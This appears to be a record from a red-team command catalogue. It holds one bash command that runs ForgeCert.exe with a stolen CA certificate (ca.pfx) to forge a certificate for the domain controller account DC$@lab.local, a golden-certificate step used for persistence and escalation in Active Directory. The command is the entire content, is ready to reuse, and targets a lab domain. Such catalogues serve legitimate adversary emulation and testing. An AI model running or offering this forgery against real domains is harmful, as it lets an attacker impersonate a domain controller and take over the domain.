---
id: 00efff12-f62f-48f8-be80-1c001b8f0291
name: Creating certificate for DC$@lab.local
type: command
executor: bash
data: ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123 --Subject CN=User
  --SubjectAltName DC$@lab.local --NewCertPath dc.pfx --NewCertPassword Password123
output: null
created_at: '2023-04-06T03:56:28.398428+00:00'
updated_at: '2023-04-10T20:37:30.878980+00:00'
---

# Creating certificate for DC$@lab.local

```bash
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123 --Subject CN=User --SubjectAltName DC$@lab.local --NewCertPath dc.pfx --NewCertPassword Password123
```
